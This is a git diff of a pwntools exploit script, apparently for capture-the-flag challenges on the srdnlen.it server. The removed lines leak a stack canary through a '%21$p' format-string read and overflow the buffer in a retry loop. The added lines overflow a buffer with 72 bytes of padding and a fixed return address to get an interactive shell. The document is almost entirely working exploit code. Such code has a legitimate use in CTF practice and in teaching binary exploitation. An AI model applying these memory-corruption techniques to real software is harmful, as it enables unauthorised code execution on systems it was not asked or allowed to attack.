@@ -4,11 +4,10 @@ from pwn import *
 # from ctypes import CDLL
 
 context.terminal = ["tmux", "splitw", "-h"]
-context.log_level = 'error' # se non vuoi vedere i loggin
-exe = context.binary = ELF(args.EXE or './write_what_where')
-
+# context.log_level = 'error' # se non vuoi vedere i loggin
+exe = context.binary = ELF(args.EXE or './ezsigrop')
 # lib = CDLL(exe.libc.path)
-host = args.HOST or 'www.chall.srdnlen.it'
+host = args.HOST or 'ezsigrop.chall.srdnlen.it'
 port = int(args.PORT or 443)
 
 
@@ -34,37 +33,20 @@ def start(argv=[], *a, **kw):
         return start_remote(argv, *a, **kw)
 
 gdbscript = '''
-b *0x4018d1
+b *0x40102b
 continue
 '''.format(**locals())
 
 # -- Exploit goes here --
 
-# io = start()
+shell = p64(0x401036)
 
-execve = p64(0x403fa8)
 
-while True:
-    try:
-        i = 0
-        io = start()
-        io.sendlineafter(b"thats it!\n", f"%21$p".encode())
-        io.recvline()
-        canary = int(io.recvline().decode().strip(),16)
-        # print(hex(canary))
-        payload = flat(b"A" * 56)
-        io.sendlineafter(b"?\n", payload + p64(canary) + b"A" * 8 + p64(0x40133f))
-        io.recvline()
-        io.recvline()
-        resp = io.recvline()
-        print(resp)
-        if b"failed" not in resp:
-            print(resp)
-            input("Fine")
-            io.interactive()
+io = start()
 
-        io.close()
-    except:
-        io.close()
-        pass
+shell1 = p64(0x401032)
+
+io.send(b"A" * 72 + shell1)
+
+io.interactive()
 
